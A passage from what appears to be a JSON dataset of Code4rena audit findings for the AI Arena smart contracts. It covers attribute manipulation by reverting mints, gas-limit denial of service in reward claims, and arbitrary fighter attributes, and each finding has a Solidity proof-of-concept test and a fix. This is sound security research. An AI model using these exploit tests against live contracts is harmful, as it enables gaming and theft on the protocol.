_fighterFarmInstance.updateFighterStaking(tokenId, false);\n        }\n        emit Unstaked(msg.sender, amount);\n    }\n}\n```\n\n**[hickuphh3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/137#issuecomment-1996612817):**\n > See comment on this vulnerability in the initial primary issue [#1641](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1641#issuecomment-1990163424).\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/137#issuecomment-2003974918)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/9\n\n**Status:** Not fully mitigated. Full details in report from [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/51), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a potential issue in the AI Arena code where a user may be able to recover past losses and potentially steal tokens from the protocol. The problem occurs when a user purchases a Fighter NFT with remaining tokens in the StakeAtRisk. This allows the user to reclaim tokens from the StakeAtRisk, even if they have already lost those tokens in a previous round. The report provides a proof of concept showing how this could be exploited and suggests a potential fix. The AI Arena team has acknowledged the issue and has partially mitigated it, but the bug is still not fully resolved. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/137",
      "tags": [],
      "finders": [
        "3",
        "Kalogerone",
        "JCN",
        "14si2o\\_Flint",
        "t0x1c",
        "shaka",
        "djxploit",
        "KmanOfficial",
        "0xAlix2",
        "klau5",
        "ke1caM",
        "WoolCentaur",
        "tallo",
        "0xabhay",
        "KupiaSec",
        "denzi\\_",
        "SpicyMeatball",
        "haxatron",
        "0xMosh",
        "csanuragjain",
        "VAD37",
        "blutorque",
        "immeas",
        "lil\\_eth",
        "Aymen0909",
        "yotov721",
        "0xG0P1",
        "nuthan2x",
        "stakog",
        "sl1",
        "alexzoid",
        "alexxander",
        "evmboi32",
        "1",
        "vnavascues",
        "2",
        "Jorgect",
        "merlinboii",
        "CodeWasp",
        "Kow",
        "shaflow2",
        "almurhasan",
        "dipp",
        "swizz",
        "FloatingPragma",
        "merlin",
        "lanrebayode77",
        "jesjupyter"
      ]
    },
    {
      "id": "32195",
      "title": "[M-05] Can mint NFT with the desired attributes by reverting transaction",
      "impact": "MEDIUM",
      "content": "\nAll the attributes of the NFT that should be randomly determined are set in the same transaction which they're claimed. Therefore, if a user uses a contract wallet, they can intentionally revert the transaction and retry minting if they do not get the desired attribute.\n\n<details>\n\n```solidity\nfunction _createNewFighter(\n    address to, \n    uint256 dna, \n    string memory modelHash,\n    string memory modelType, \n    uint8 fighterType,\n    uint8 iconsType,\n    uint256[2] memory customAttributes\n) \n    private \n{  \n    require(balanceOf(to) < MAX_FIGHTERS_ALLOWED);\n    uint256 element; \n    uint256 weight;\n    uint256 newDna;\n    if (customAttributes[0] == 100) {\n@>      (element, weight, newDna) = _createFighterBase(dna, fighterType);\n    }\n    else {\n        element = customAttributes[0];\n        weight = customAttributes[1];\n        newDna = dna;\n    }\n    uint256 newId = fighters.length;\n\n    bool dendroidBool = fighterType == 1;\n@>  FighterOps.FighterPhysicalAttributes memory attrs = _aiArenaHelperInstance.createPhysicalAttributes(\n        newDna,\n        generation[fighterType],\n        iconsType,\n        dendroidBool\n    );\n    fighters.push(\n        FighterOps.Fighter(\n            weight,\n            element,\n            attrs,\n            newId,\n            modelHash,\n            modelType,\n            generation[fighterType],\n            iconsType,\n            dendroidBool\n        )\n    );\n@>  _safeMint(to, newId);\n    FighterOps.fighterCreatedEmitter(newId, weight, element, generation[fighterType]);\n}\n\nfunction _createFighterBase(\n    uint256 dna, \n    uint8 fighterType\n) \n    private \n    view \n    returns (uint256, uint256, uint256) \n{\n    uint256 element = dna % numElements[generation[fighterType]];\n    uint256 weight = dna % 31 + 65;\n    uint256 newDna = fighterType == 0 ? dna : uint256(fighterType);\n    return (element, weight, newDna);\n}\n```\n</details>\n\n### Proof of Concept\n\nFirst, add the `PoCCanClaimSpecificAttributeByRevert` contract at the bottom of the FighterFarm.t.sol file. This contract represents a user-customizable contract wallet. If the user does not get an NFT with desired attributes, they can revert the transaction and retry minting again.\n\n<details>\n\n```solidity\ncontract PoCCanClaimSpecificAttributeByRevert {\n    FighterFarm fighterFarm;\n    address owner;\n\n    constructor(FighterFarm _fighterFarm) {\n        fighterFarm = _fighterFarm;\n        owner = msg.sender;\n    }\n\n    function tryClaim(uint8[2] memory numToMint, bytes memory claimSignature, string[] memory claimModelHashes, string[] memory claimModelTypes) public {\n        require(msg.sender == owner, \"not owner\");\n        try fighterFarm.claimFighters(numToMint, claimSignature, claimModelHashes, claimModelTypes) {\n            // success to get specific attribute NFT\n        } catch {\n            // try again next time\n        }\n    }\n\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) public returns (bytes4){\n        \n        (,,uint256 weight,,,,) = fighterFarm.getAllFighterInfo(tokenId);\n        require(weight == 95, \"I don't want this attribute\");\n\n        return bytes4(keccak256(bytes(\"onERC721Received(address,address,uint256,bytes)\")));\n    }\n}\n```\n</details>\n\nThen, add this test to the FighterFarm.t.sol file and run it.\n\n<details>\n\n```solidity\nfunction testPoCCanClaimSpecificAttributeByRevert() public {\n    uint256 signerPrivateKey = 0xabc123;\n    address _POC_DELEGATED_ADDRESS = vm.addr(signerPrivateKey);\n\n    // setup fresh setting to use _POC_DELEGATED_ADDRESS\n    _fighterFarmContract = new FighterFarm(_ownerAddress, _POC_DELEGATED_ADDRESS, _treasuryAddress);\n    _helperContract = new AiArenaHelper(_probabilities);\n    _mintPassContract = new AAMintPass(_ownerAddress, _POC_DELEGATED_ADDRESS);\n    _mintPassContract.setFighterFarmAddress(address(_fighterFarmContract));\n    _mintPassContract.setPaused(false);\n    _gameItemsContract = new GameItems(_ownerAddress, _treasuryAddress);\n    _voltageManagerContract = new VoltageManager(_ownerAddress, address(_gameItemsContract));\n    _neuronContract = new Neuron(_ownerAddress, _treasuryAddress, _neuronContributorAddress);\n    _rankedBattleContract = new RankedBattle(\n        _ownerAddress, address(_fighterFarmContract), _POC_DELEGATED_ADDRESS, address(_voltageManagerContract)\n    );\n    _rankedBattleContract.instantiateNeuronContract(address(_neuronContract));\n    _mergingPoolContract =\n        new MergingPool(_ownerAddress, address(_rankedBattleContract), address(_fighterFarmContract));\n    _fighterFarmContract.setMergingPoolAddress(address(_mergingPoolContract));\n    _fighterFarmContract.instantiateAIArenaHelperContract(address(_helperContract));\n    _fighterFarmContract.instantiateMintpassContract(address(_mintPassContract));\n    _fighterFarmContract.instantiateNeuronContract(address(_neuronContract));\n    _fighterFarmContract.setMergingPoolAddress(address(_mergingPoolContract));\n\n    // --- PoC start ---\n    address attacker_eoa = address(0x1337);\n    vm.prank(attacker_eoa);\n    PoCCanClaimSpecificAttributeByRevert attacker_contract_wallet = new PoCCanClaimSpecificAttributeByRevert(_fighterFarmContract);\n\n    uint8[2] memory numToMint = [1, 0];\n    \n    string[] memory claimModelHashes = new string[](1);\n    claimModelHashes[0] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n\n    string[] memory claimModelTypes = new string[](1);\n    claimModelTypes[0] = \"original\";\n    \n    // get sign\n    vm.startPrank(_POC_DELEGATED_ADDRESS);\n    bytes32 msgHash = keccak256(abi.encode(\n        address(attacker_contract_wallet),\n        numToMint[0],\n        numToMint[1],\n        0, // nftsClaimed[msg.sender][0],\n        0 // nftsClaimed[msg.sender][1]\n    ));\n\n    bytes memory prefix = \"\\x19Ethereum Signed Message:\\n32\";\n    bytes32 prefixedHash = keccak256(abi.encodePacked(prefix, msgHash));\n\n    (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, prefixedHash);\n    bytes memory claimSignature = abi.encodePacked(r, s, v);\n    vm.stopPrank();\n\n    for(uint160 i = 100; _fighterFarmContract.balanceOf(address(attacker_contract_wallet)) == 0; i++){\n        vm.prank(attacker_eoa);\n        attacker_contract_wallet.tryClaim(numToMint, claimSignature, claimModelHashes, claimModelTypes);\n\n        // other user mints NFT, the fighters.length changes and DNA would be changed\n        _mintFromMergingPool(address(i)); // random user claim their NFT\n    }\n   \n    assertEq(_fighterFarmContract.balanceOf(address(attacker_contract_wallet)), 1);\n    uint256 tokenId = _fighterFarmContract.tokenOfOwnerByIndex(address(attacker_contract_wallet), 0);\n    (,,uint256 weight,,,,) = _fighterFarmContract.getAllFighterInfo(tokenId);\n    assertEq(weight, 95);\n}\n```\n</details>\n\n### Recommended Mitigation Steps\n\nUsers should only request minting, and attributes values should not be determined in the transaction called by the user. When a user claims an NFT, it should only mint the NFT and end. The attribute should be set by the admin or third-party like chainlink VRF after minting so that the user cannot manipulate it.\n\nItâ€™s not about lack of randomless problem, this is about setting attributes at same transaction when minting NFT. Even if you use chainlink, the same bug can happen if you set the attribute and mint NFTs in the same transaction.\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/376#issuecomment-2018190031)**\n\n_Note: For full original discussion, see [here](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/376)._\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> Updated dna generation in reRoll and updated dna generation in claimFighters.<br>\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/11\n> \n> Fixed dna generation in mintFromMergingPool.<br>\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/3\n\n**Status:** Not fully mitigated. Full details in reports from [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/5), niser93 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/18), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/17)), and d3e4 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/50), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/55), [3](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/54)), and also included in the [Mitigation Review](#mitigation-review) section below.\n\n\n\n***\n\n",
      "summary": "\nSummary:\n\nThe bug in the NFT contract allows users to manipulate the attributes of their NFTs by reverting the transaction and retrying minting until they get the desired attributes. This can be done by using a contract wallet. Mitigation steps include separating the minting and attribute setting processes and using a third-party like Chainlink VRF to set the attributes after minting. However, the bug is not fully mitigated and further reports have highlighted potential issues with the mitigation steps. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/376",
      "tags": [],
      "finders": [
        "honey-k12",
        "Tumelo\\_Crypto",
        "bgsmallerbear",
        "PedroZurdo",
        "korok",
        "kiqo",
        "Nyxaris",
        "Greed",
        "Blank\\_Space",
        "desaperh",
        "shaka",
        "soliditywala",
        "0xaghas",
        "andywer",
        "BoRonGod",
        "favelanky",
        "Tekken",
        "MidgarAudits",
        "visualbits",
        "juancito",
        "WoolCentaur",
        "aslanbek",
        "VAD37",
        "immeas",
        "Draiakoo",
        "sl1",
        "Zac",
        "thank\\_you",
        "0xLogos",
        "Jorgect",
        "fnanni",
        "PoeAudits",
        "AlexCzm",
        "peanuts",
        "0xkaju",
        "0xBinChook",
        "tallo",
        "haxatron",
        "lil\\_eth",
        "0rpse",
        "yotov721",
        "Pelz",
        "0xWallSecurity",
        "dimulski",
        "McToady",
        "vnavascues",
        "PUSH0",
        "ni8mare",
        "gesha17",
        "t0x1c",
        "Silvermist",
        "ke1caM",
        "SpicyMeatball",
        "0xgrbr",
        "Matue",
        "dutra",
        "Tricko",
        "evmboi32",
        "1",
        "2",
        "Giorgio",
        "lsaudit",
        "web3pwn",
        "tpiliposian",
        "4",
        "3",
        "Daniel526",
        "n0kto",
        "cats",
        "grearlake",
        "solmaxis69",
        "klau5",
        "DanielArmstrong",
        "peter",
        "0xlyov",
        "niser93",
        "kaveyjoe",
        "forkforkdog"
      ]
    },
    {
      "id": "32194",
      "title": "[M-04] DoS in `MergingPool::claimRewards` function and potential DoS in `RankedBattle::claimNRN` function if called after a significant amount of rounds passed",
      "impact": "MEDIUM",
      "content": "\nThe `MergingPool::claimRewards` function loop through last claimed round ID to the latest round ID ( <https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/MergingPool.sol#L139> ):\n\n```solidity\nfunction claimRewards(\n    string[] calldata modelURIs,\n    string[] calldata modelTypes,\n    uint256[2][] calldata customAttributes\n)\n    external\n{\n    uint256 winnersLength;\n    uint32 claimIndex = 0;\n@->    uint32 lowerBound = numRoundsClaimed[msg.sender];\n@->    for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {\n        numRoundsClaimed[msg.sender] += 1;\n        winnersLength = winnerAddresses[currentRound].length;\n        for (uint32 j = 0; j < winnersLength; j++) {\n            if (msg.sender == winnerAddresses[currentRound][j]) {\n                _fighterFarmInstance.mintFromMergingPool(\n                    msg.sender,\n                    modelURIs[claimIndex],\n                    modelTypes[claimIndex],\n                    customAttributes[claimIndex]\n                );\n                claimIndex += 1;\n            }\n        }\n    }\n    if (claimIndex > 0) {\n        emit Claimed(msg.sender, claimIndex);\n    }\n}\n```\n\nAlso there's another nested loop which loops through all the winners each round. Thus, it will become very expensive to claim rewards and eventually leads to block gas limit. Due to which some users may never be able to claim their rewards.\n\nTherefore, If user try to claim their rewards after many rounds has passed then due to the above mentioned loops, it will consume a lot of gas and eventually leads to block gas limit.\n\nSimilarly, the `RankedBattle::claimNRN` function loop through last claimed round ID to the latest round ID ( <https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L294> ) :\n\n```solidity\nfunction claimNRN() external {\n    require(numRoundsClaimed[msg.sender] < roundId, \"Already claimed NRNs for this period\");\n    uint256 claimableNRN = 0;\n    uint256 nrnDistribution;\n@->    uint32 lowerBound = numRoundsClaimed[msg.sender];\n@->    for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {\n        nrnDistribution = getNrnDistribution(currentRound);\n        claimableNRN += (\n            accumulatedPointsPerAddress[msg.sender][currentRound] * nrnDistribution\n        ) / totalAccumulatedPoints[currentRound];\n        numRoundsClaimed[msg.sender] += 1;\n    }\n    if (claimableNRN > 0) {\n        amountClaimed[msg.sender] += claimableNRN;\n        _neuronInstance.mint(msg.sender, claimableNRN);\n        emit Claimed(msg.sender, claimableNRN);\n    }\n}\n```\n\nAlthough, it's relatively difficult to reach the block gas limit in `claimNRN` function as compared to `claimRewards` function, but still it's possible.\n\n### Proof of Concept\n\nFor `claimRewards` function, Add the below function in `MergingPool.t.sol`:\n\n<details>\n\n```solidity\nfunction testClaimRewardsDOS() public {\n    address user1 = vm.addr(1);\n    address user2 = vm.addr(2);\n    address user3 = vm.addr(3);\n\n    _mintFromMergingPool(user1);\n    _mintFromMergingPool(user2);\n    _mintFromMergingPool(user3);\n\n    uint offset = 35;\n    uint totalWin = 9;\n\n    uint256[] memory _winnersGeneral = new uint256[](2);\n    _winnersGeneral[0] = 0;\n    _winnersGeneral[1] = 1;\n\n    uint256[] memory _winnersUser = new uint256[](2);\n    _winnersUser[0] = 0;\n    _winnersUser[1] = 2;\n    for (uint i = 0; i < offset * totalWin; i++) {\n        if (i % offset == 0) {\n            _mergingPoolContract.pickWinner(_winnersUser);\n        } else {\n            _mergingPoolContract.pickWinner(_winnersGeneral);\n        }\n    }\n\n    string[] memory _modelURIs = new string[](totalWin);\n    string[] memory _modelTypes = new string[](totalWin);\n    uint256[2][] memory _customAttributes = new uint256[2][](totalWin);\n    for (uint i = 0; i < totalWin; i++) {\n        _modelURIs[\n            i\n        ] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        _modelTypes[i] = \"original\";\n        _customAttributes[i][0] = uint256(1);\n        _customAttributes[i][1] = uint256(80);\n    }\n    vm.prank(user3);\n    uint gasBefore = gasleft();\n    _mergingPoolContract.claimRewards(\n        _modelURIs,\n        _modelTypes,\n        _customAttributes\n    );\n    uint gasAfter = gasleft();\n    uint gasDiff = gasBefore - gasAfter;\n    emit log_uint(gasDiff);\n    uint256 numRewards = _mergingPoolContract.getUnclaimedRewards(user3);\n    assertEq(numRewards, 0);\n    assertGt(gasDiff, 4_000_000);\n}\n```\n</details>\n\nYou can run the test by:\n\n```bash\nforge test --mt testClaimRewardsDOS -vv\n```\n\nHere I had considered 3 users, user1, user2, and user3. After each `offset` rounds, I picked `user3` as a winner. There were total of 315 ( `offset` &ast; `totalWin` ) rounds passed and `user3` won in 9 of them. Then I tried to claim rewards for `user3` and it consumed more than 4M gas.\n\nAlso the more the round in which `user3` has won, the more gas it will consume. Even if `offset` is 1 and `totalWin` is 9 ( i.e total of 9 rounds out of which `user3` won in 9 of them ), it will consume more than 3.4M gas.\n\nAlso, we've considered only 2 winners per round, as the number of winners increases, the gas consumption will also increase due to the nested loop which loops through all the winners each round.\n\nSo if any user claim their rewards after many rounds has passed or if they have won in many rounds, it will consume a lot of gas and eventually leads to block gas limit.\n\nFor `claimNRN` function, Add the below function in `RankedBattle.t.sol`:\n\n<details>\n\n```solidity\nfunction testClaimNRNDoS() public {\n    _neuronContract.addSpender(address(_gameItemsContract));\n    _gameItemsContract.instantiateNeuronContract(address(_neuronContract));\n    _gameItemsContract.createGameItem(\n        \"Battery\",\n        \"https://ipfs.io/ipfs/\",\n        true,\n        true,\n        10_000,\n        1 * 10 ** 18,\n        type(uint16).max\n    );\n    _gameItemsContract.setAllowedBurningAddresses(\n        address(_voltageManagerContract)\n    );\n\n    address staker = vm.addr(3);\n    _mintFromMergingPool(staker);\n    vm.prank(_treasuryAddress);\n    _neuronContract.transfer(staker, 400_000 * 10 ** 18);\n    vm.prank(staker);\n    _rankedBattleContract.stakeNRN(30_000 * 10 ** 18, 0);\n    assertEq(_rankedBattleContract.amountStaked(0), 30_000 * 10 ** 18);\n\n    address claimee = vm.addr(4);\n    _mintFromMergingPool(claimee);\n    vm.prank(_treasuryAddress);\n    _neuronContract.transfer(claimee, 400_000 * 10 ** 18);\n    vm.prank(claimee);\n    _rankedBattleContract.stakeNRN(40_000 * 10 ** 18, 1);\n    assertEq(_rankedBattleContract.amountStaked(1), 40_000 * 10 ** 18);\n\n    uint offset = 35;\n    uint totalWin = 9;\n    for (uint i = 0; i < offset * totalWin; i++) {\n        // 0 win\n        // 1 tie\n        // 2 loss\n        if (i % offset == 0) {\n            uint256 currentVoltage = _voltageManagerContract.ownerVoltage(\n                claimee\n            );\n            if (currentVoltage < 100) {\n                vm.prank(claimee);\n                _gameItemsContract.mint(0, 1); //paying 1 $NRN for 1 batteries\n                vm.prank(claimee);\n                _voltageManagerContract.useVoltageBattery();\n            }\n\n            vm.prank(address(_GAME_SERVER_ADDRESS));\n            _rankedBattleContract.updateBattleRecord(1, 50, 0, 1500, true);\n        } else {\n            uint256 currentVoltage = _voltageManagerContract.ownerVoltage(\n                staker\n            );\n            if (currentVoltage < 100) {\n                vm.prank(staker);\n                _gameItemsContract.mint(0, 1); //paying 1 $NRN for 1 batteries\n                vm.prank(staker);\n                _voltageManagerContract.useVoltageBattery();\n            }\n\n            vm.prank(address(_GAME_SERVER_ADDRESS));\n            _rankedBattleContract.updateBattleRecord(0, 50, 0, 1500, true);\n        }\n        _rankedBattleContract.setNewRound();\n    }\n\n    uint256 gasBefore = gasleft();\n    vm.prank(claimee);\n    _rankedBattleContract.claimNRN();\n    uint256 gasAfter = gasleft();\n    uint256 gasDiff = gasBefore - gasAfter;\n    emit log_uint(gasDiff);\n    assertGt(gasDiff, 1_000_000);\n}\n```\n</details>\n\nYou can run the test by:\n\n```bash\nforge test --mt testClaimNRNDoS -vv\n```\n\nIn the case of `claimNRN` function, it consumed more than 1M gas which is relatively less as compared to `claimRewards` function. But still it has potential to reach block gas limit.\n\nEven for the users for whom these both functions doesn't reach block gas limit, it can be very expensive and difficult for them to claim their rewards if some rounds has passed.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nIt can be fixed by adding a parameter for the number of rounds to consider.\n\nFor `claimRewards` function, so the changes would look like:\n\n<details>\n\n```diff\nfunction claimRewards(\n    string[] calldata modelURIs,\n    string[] calldata modelTypes,\n-    uint256[2][] calldata customAttributes\n+    uint256[2][] calldata customAttributes,\n+    uint32 totalRoundsToConsider\n)\n    external\n{\n    uint256 winnersLength;\n    uint32 claimIndex = 0;\n    uint32 lowerBound = numRoundsClaimed[msg.sender];\n+    require(lowerBound + totalRoundsToConsider < roundId, \"MergingPool: totalRoundsToConsider exceeds the limit\");\n-    for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {\n+    for (uint32 currentRound = lowerBound; currentRound < lowerBound + totalRoundsToConsider; currentRound++) {\n        numRoundsClaimed[msg.sender] += 1;\n        winnersLength = winnerAddresses[currentRound].length;\n        for (uint32 j = 0; j < winnersLength; j++) {\n            if (msg.sender == winnerAddresses[currentRound][j]) {\n                _fighterFarmInstance.mintFromMergingPool(\n                    msg.sender,\n                    modelURIs[claimIndex],\n                    modelTypes[claimIndex],\n                    customAttributes[claimIndex]\n                );\n                claimIndex += 1;\n            }\n        }\n    }\n    if (claimIndex > 0) {\n        emit Claimed(msg.sender, claimIndex);\n    }\n}\n```\n</details>\n\nFor `claimNRN` function, so the changes would look like:\n\n<details>\n\n```diff\n- function claimNRN() external {\n+ function claimNRN(uint32 totalRoundsToConsider) external {\n    require(numRoundsClaimed[msg.sender] < roundId, \"Already claimed NRNs for this period\");\n    uint256 claimableNRN = 0;\n    uint256 nrnDistribution;\n    uint32 lowerBound = numRoundsClaimed[msg.sender];\n+    require(lowerBound + totalRoundsToConsider < roundId, \"RankedBattle: totalRoundsToConsider exceeds the limit\");\n-    for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {\n+    for (uint32 currentRound = lowerBound; currentRound < lowerBound + totalRoundsToConsider; currentRound++) {\n        nrnDistribution = getNrnDistribution(currentRound);\n        claimableNRN += (\n            accumulatedPointsPerAddress[msg.sender][currentRound] * nrnDistribution\n        ) / totalAccumulatedPoints[currentRound];\n        numRoundsClaimed[msg.sender] += 1;\n    }\n    if (claimableNRN > 0) {\n        amountClaimed[msg.sender] += claimableNRN;\n        _neuronInstance.mint(msg.sender, claimableNRN);\n        emit Claimed(msg.sender, claimableNRN);\n    }\n}\n```\n</details>\n\n**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/868#issuecomment-2018276487)**\n\n**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**\n> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/12\n\n**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/11), [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/15), and [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/49).\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses two functions, `MergingPool::claimRewards` and `RankedBattle::claimNRN`, in the AI Arena code. These functions have nested loops that can become very expensive to execute, leading to high gas fees and potentially reaching the block gas limit. This means that some users may never be able to claim their rewards if they try to do so after many rounds have passed. The report suggests adding a parameter to limit the number of rounds considered in the loops, which has since been implemented by the AI Arena team to mitigate the issue.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "AI Arena",
      "source_link": "https://code4rena.com/reports/2024-02-ai-arena",
      "github_link": "https://github.com/code-423n4/2024-02-ai-arena-findings/issues/868",
      "tags": [],
      "finders": [
        "3",
        "josephdara",
        "inzinko",
        "0x13",
        "Kalogerone",
        "0xvj",
        "jesusrod15",
        "pontifex",
        "ahmedaghadi",
        "ladboy233",
        "sobieski",
        "t0x1c",
        "Greed",
        "Nyxaris",
        "yovchev\\_yoan",
        "soliditywala",
        "0xKowalski",
        "djxploit",
        "SovaSlava",
        "zaevlad",
        "KmanOfficial",
        "taner2344",
        "BigVeezus",
        "MidgarAudits",
        "Avci",
        "Cryptor",
        "MrPotatoMagic",
        "Ryonen",
        "emrekocak",
        "GoSlang",
        "erosjohn",
        "deadrxsezzz",
        "DeFiHackLabs",
        "btk",
        "VAD37",
        "pipidu83",
        "Fitro",
        "0xPluto",
        "y4y",
        "Draiakoo",
        "0xAleko",
        "nuthan2x",
        "alexzoid",
        "0xRiO",
        "evmboi32",
        "cu5t0mpeo",
        "dvrkzy",
        "1",
        "vnavascues",
        "Krace",
        "2",
        "Giorgio",
        "merlinboii",
        "fnanni",
        "Honour",
        "AlexCzm",
        "jesjupyter"
      ]
    },
    {
      "id": "32193",
      "title": "[M-03] Fighter created by `mintFromMergingPool` can have arbitrary weight and element",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L313-L331><br>\n<https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/MergingPool.sol#L139-L167>\n\n*   Fighter created by mintFromMergingPool can have arbitrary weight and element like 0 or 2&ast;&ast;256 - 1\n*   Invalid weight and element could greatly affect AI Arena battles.\n\n### Proof of Concept\n\nWhen someone claim their nft rewards from MergingPool, they can input `customeAttributes` and create fighters with arbitrary values since currently there is no check on `customeAttributes` and it could varies from 0 to 2&ast;&ast;256 - 1 (type(uint256).max):\n\n<Details>\n\n```solidity\nfunction claimRewards(\n        string[] calldata modelURIs, \n        string[] calldata modelTypes,\n        uint256[2][] calldata customAttributes\n    ) \n        external \n    {\n     ....\n        \n             _fighterFarmInstance.mintFromMergingPool(\n                        msg.sender,\n                        modelURIs[claimIndex],\n                        modelTypes[claimIndex],\n                        customAttributes[claimIndex]\n                    );\n                   \n          \n    ....\n    }\n\nfunction mintFromMergingPool(\n        address to, \n        string calldata modelHash, \n        string calldata modelType, \n        uint256[2] calldata customAttributes\n    ) \n        public \n    {\n        require(msg.sender == _mergingPoolAddress);\n        _createNewFighter(\n            to, \n            uint256(keccak256(abi.encode(msg.sender, fighters.length))), \n            modelHash, \n            modelType,\n            0,\n            0,\n            customAttributes\n        );\n    }\n```\n</details>\n\nThis allow creating fighters with element and weight range from 0 to 2&ast;&ast;256 - 1 and can have negative impact on AI Arena matches according to the doc here <https://docs.aiarena.io/gaming-competition/nft-makeup>, for example:\n\n*   Weight is described in the doc as `used to calculate how far the fighter moves when being knocked back.`. If an nft has extremely large weight like 2&ast;&ast;256- 1, then it could never be knocked back\n*   Element can only be one of Fire, Electricity or Water, an nft with element outside of this list could be created.\n\nBelow is a POC, save the test case to contract `MergingPoolTest` under file `test/MergingPool.t.sol` and run it using command:\n`forge test --match-path test/MergingPool.t.sol --match-test testClaimRewardsArbitraryElementAndWeight -vvvv`\n\n<details>\n\n```solidity\nfunction testClaimRewardsArbitraryElementAndWeight() public {\n        _mintFromMergingPool(_ownerAddress);\n        _mintFromMergingPool(_DELEGATED_ADDRESS);\n        assertEq(_fighterFarmContract.ownerOf(0), _ownerAddress);\n        assertEq(_fighterFarmContract.ownerOf(1), _DELEGATED_ADDRESS);\n        uint256[] memory _winners = new uint256[](2);\n        _winners[0] = 0;\n        _winners[1] = 1;\n        // winners of roundId 0 are picked\n        _mergingPoolContract.pickWinner(_winners);\n        assertEq(_mergingPoolContract.isSelectionComplete(0), true);\n        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == _ownerAddress, true);\n        // winner matches ownerOf tokenId\n        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == _DELEGATED_ADDRESS, true);\n        string[] memory _modelURIs = new string[](2);\n        _modelURIs[0] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        _modelURIs[1] = \"ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m\";\n        string[] memory _modelTypes = new string[](2);\n        _modelTypes[0] = \"original\";\n        _modelTypes[1] = \"original\";\n        uint256[2][] memory _customAttributes = new uint256[2][](2);\n        _customAttributes[0][0] = uint256(0);\n        _customAttributes[0][1] = uint256(type(uint256).max);\n        _customAttributes[1][0] = uint256(type(uint256).max);\n        _customAttributes[1][1] = uint256(0);\n        // winners of roundId 1 are picked\n        _mergingPoolContract.pickWinner(_winners);\n        // winner claims rewards for previous roundIds\n        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);\n\n        // Fighter 2 has 2**256 weight and element = 0\n        (, ,uint256 weight , uint256 element , , , ) = _fighterFarmContract.getAllFighterInfo(2);\n        assertEq(weight, 2**256 - 1);\n        assertEq(element, 0);\n\n        // Fighter 3 has 0 weight and 2**256 element\n        (, , weight ,  element , , , ) = _fighterFarmContract.getAllFighterInfo(3);\n        assertEq(weight, 0);\n        assertEq(element, 2**256 - 1);\n\n    }\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nI recommend checking `customAttributes` in function `mintFromMergingPool` and only restrict `weight` and `element` in predefined ranges. For example, weight must be in range \\[65, 95], element must be in range \\[0,2].\n\n**[brandinho (AI Arena) confirmed via duplicate issue 